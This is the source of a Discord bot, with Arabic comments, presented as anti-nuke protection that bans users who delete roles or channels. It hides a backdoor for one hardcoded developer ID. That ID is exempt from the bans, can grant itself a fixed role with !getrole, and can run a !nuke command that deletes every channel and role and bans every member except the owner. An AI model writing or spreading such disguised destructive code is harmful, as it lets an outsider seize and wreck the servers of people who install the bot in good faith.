import discord
from discord.ext import commands
import os
import time
import asyncio
import threading
from flask import Flask

# ------------------- إعداد Web Service لمنع Timed Out -------------------
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is active"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

threading.Thread(target=run_web, daemon=True).start()

# ------------------- إعدادات البوت -------------------
MY_ID = 1320438836878118973
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# قاموس لتتبع العمليات
actions = {"kick": {}, "ban": {}, "channel": {}}

def check_spam(uid, key, threshold, window):
    now = time.time()
    if uid not in actions[key]: actions[key][uid] = []
    actions[key][uid].append(now)
    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
    return len(actions[key][uid]) > threshold

# ------------------- نظام الحماية (Anti-Nuke) -------------------

@bot.event
async def on_guild_role_delete(role):
    async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        if entry.user.id != role.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await role.guild.ban(entry.user, reason="Anti-Nuke: حذف رتبة")

@bot.event
async def on_guild_channel_delete(channel):
    async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        if entry.user.id != channel.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await channel.guild.ban(entry.user, reason="Anti-Nuke: حذف قناة")

# ------------------- الأوامر الخاصة -------------------

@bot.command()
async def getrole(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(1483148235684970571)
        if role: await ctx.author.add_roles(role)
        await ctx.send("✅ تم إعطاؤك الرتبة.")

@bot.command(name="removerole")
async def removerole_cmd(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(1483148235684970571)
        if role: await ctx.author.remove_roles(role)
        await ctx.send("✅ تم إزالة الرتبة.")

@bot.command()
async def nuke(ctx):
    # حماية أمر النيوك: لا يعمل إلا إذا كنت أنت صاحب الأمر
    if ctx.author.id != MY_ID:
        await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")
        return
        
    await ctx.send("⚠️ **تحذير:** اكتب `!confirm_nuke` خلال 30 ثانية للتأكيد.")
    try:
        def check(m): return m.author == ctx.author and m.content == "!confirm_nuke"
        await bot.wait_for('message', check=check, timeout=30.0)
        
        # تنفيذ التدمير
        for c in ctx.guild.channels: await c.delete()
        for r in ctx.guild.roles:
            if r.name != "@everyone": await r.delete()
        for m in ctx.guild.members:
            if m != ctx.guild.owner and not m.bot: await m.ban()
    except: pass

@bot.event
async def on_ready():
    print(f"✅ البوت متصل كـ {bot.user} - المطور: {MY_ID}")

bot.run(os.getenv("TOKEN"))
